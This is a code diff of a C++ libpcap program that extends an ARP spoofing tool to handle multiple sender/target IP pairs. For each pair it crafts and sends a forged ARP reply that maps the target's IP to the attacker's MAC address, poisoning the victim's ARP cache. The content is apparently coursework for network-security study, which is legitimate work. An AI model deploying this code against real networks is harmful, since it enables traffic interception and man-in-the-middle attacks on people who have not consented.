@@ -18,34 +18,36 @@ int main(int argc, char* argv[]) {
 		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
 		return -1;
 	}
+	for(int i = 0; i < (argc-2)/2; i++){
+		Mac myMac = GetMyMac(std::string(dev));
+		Ip myip = GetMyIp(std::string(dev));
+		Mac sender_mac = GetMacfromIp(handle, Ip(argv[2 + 2*i]), myMac, myip);
+		Mac target_mac = GetMacfromIp(handle, Ip(argv[3 + 2*i]), myMac, myip);
 
-	Mac myMac = GetMyMac(std::string(dev));
-	Ip myip = GetMyIp(std::string(dev));
-	Mac sender_mac = GetMacfromIp(handle, Ip(argv[2]), myMac, myip);
-	Mac target_mac = GetMacfromIp(handle, Ip(argv[3]), myMac, myip);
-
-	std::cout << "[1] My ip Address :      " << std::string(myip) << "\n";
-	std::cout << "[1] My Mac Address :     " << std::string(myMac) << "\n";
-	std::cout << "[1] sender ip :          " << argv[2] << "\n";
-	std::cout << "[1] sender Mac Address : " << std::string(sender_mac) << "\n";
-	std::cout << "[1] target ip :          " << argv[3] << "\n";
-	std::cout << "[1] target Mac Address : " << std::string(target_mac) << "\n";
-	
+		std::cout << "[" << i << "] My ip Address :      " << std::string(myip) << "\n";
+		std::cout << "[" << i << "] My Mac Address :     " << std::string(myMac) << "\n";
+		std::cout << "[" << i << "] sender ip :          " << argv[2 + 2*i] << "\n";
+		std::cout << "[" << i << "] sender Mac Address : " << std::string(sender_mac) << "\n";
+		std::cout << "[" << i << "] target ip :          " << argv[3 + 2*i] << "\n";
+		std::cout << "[" << i << "] target Mac Address : " << std::string(target_mac) << "\n";
+		
 
 
-	EthArpPacket packet;
-	// eth : myMac -> sender_mac
-	// arp mac : myMac -> sender_mac
-	// arp ip : target -> sender_mac
-	MakeEthPacket(&packet, false, std::string(myMac).c_str(), std::string(sender_mac).c_str()
-					, std::string(myMac).c_str(), std::string(sender_mac).c_str(), argv[3], argv[2]);
+		EthArpPacket packet;
+		// eth : myMac -> sender_mac
+		// arp mac : myMac -> sender_mac
+		// arp ip : target -> sender_mac
+		MakeEthPacket(&packet, false, std::string(myMac).c_str(), std::string(sender_mac).c_str()
+						, std::string(myMac).c_str(), std::string(sender_mac).c_str(), argv[3 + 2*i], argv[2 + 2*i]);
 
-	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-	if (res != 0) {
-		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+		if (res != 0) {
+			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+		}
+		
+		std::cout << "[" << i <<"] DONE!" << "\n";
 	}
-	
-	std::cout << "[1] DONE!" << "\n";
+
 
 	pcap_close(handle);
 
